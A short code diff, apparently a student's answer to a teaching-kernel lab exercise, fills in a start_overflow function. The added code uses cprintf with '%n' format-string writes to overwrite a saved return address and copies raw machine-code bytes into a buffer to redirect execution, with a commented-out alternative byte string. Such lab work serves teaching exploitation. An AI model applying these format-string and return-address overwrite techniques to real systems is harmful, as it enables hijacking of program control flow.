@@ -88,9 +88,21 @@ start_overflow(void)
     char *pret_addr;
 
 	// Your code here.
-    
-
-
+	uint32_t addr = read_pretaddr();
+	memset(str, 0xd, 255);
+	str[255] = '\0';
+	str[0xfc] = '\0';
+	cprintf("%s%n", str, addr + 1);
+	str[0xa0] = '\0';
+	cprintf("%s%n", str, addr);
+	memset(str, '\0', 255);
+	const char *malwarm = 
+	"\x81\xec\x10\x01\x00\x00\xe8\x93\x0b\xff\xff\x81\xc4\x10\x01\x00\x00\xe9\xff\x0c\xff\xff";
+	memcpy(str, malwarm, 24);
+	// strcpy(str , "\xff\x15\x0d\x09\x10\xf0\xff\x25\x2a\x09\x10\xf0");
+	if (str[16] != malwarm[16]) {
+		cprintf("%s", "");
+	}
 }
 
 void
